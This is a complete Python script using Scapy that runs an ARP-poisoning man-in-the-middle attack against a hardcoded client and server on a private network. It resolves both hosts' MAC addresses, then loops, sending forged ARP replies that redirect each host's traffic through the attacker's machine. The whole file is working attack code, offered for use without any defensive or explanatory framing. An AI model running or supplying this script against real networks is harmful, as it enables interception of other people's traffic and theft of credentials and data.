#!/usr/bin/env python3
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip
import time
import sys

def arp_poison():
    # Configuration - only IPs and interface needed
    client_ip = "172.18.7.40"
    server_ip = "172.18.7.10"
    interface = "eth0"  # Adjust interface if needed (e.g., ens33)
    
    attacker_mac = get_if_hwaddr(interface)

    print(f"[*] Resolving MAC addresses for Client ({client_ip}) and Server ({server_ip})...")
    client_mac = getmacbyip(client_ip)
    server_mac = getmacbyip(server_ip)

    if not client_mac:
        print(f"[-] Error: Could not resolve MAC address for Client IP {client_ip}")
        sys.exit(1)
    if not server_mac:
        print(f"[-] Error: Could not resolve MAC address for Server IP {server_ip}")
        sys.exit(1)

    print(f"[+] Discovered Client MAC: {client_mac}")
    print(f"[+] Discovered Server MAC: {server_mac}")
    print(f"[+] Attacker MAC: {attacker_mac}\n")

    # 1. Packet to poison the Client: Claiming Server IP is at Attacker MAC
    packet_to_client = ARP(
        op=2,
        hwsrc=attacker_mac,
        psrc=server_ip,
        hwdst=client_mac,
        pdst=client_ip
    )
    ether_to_client = Ether(dst=client_mac) / packet_to_client

    # 2. Packet to poison the Server: Claiming Client IP is at Attacker MAC
    packet_to_server = ARP(
        op=2,
        hwsrc=attacker_mac,
        psrc=client_ip,
        hwdst=server_mac,
        pdst=server_ip
    )
    ether_to_server = Ether(dst=server_mac) / packet_to_server

    print("[*] Sending ARP poisoning packets continuously. Press Ctrl+C to stop.")
    
    try:
        while True:
            sendp(ether_to_client, iface=interface, verbose=False)
            sendp(ether_to_server, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP poisoning.")

if __name__ == "__main__":
    arp_poison()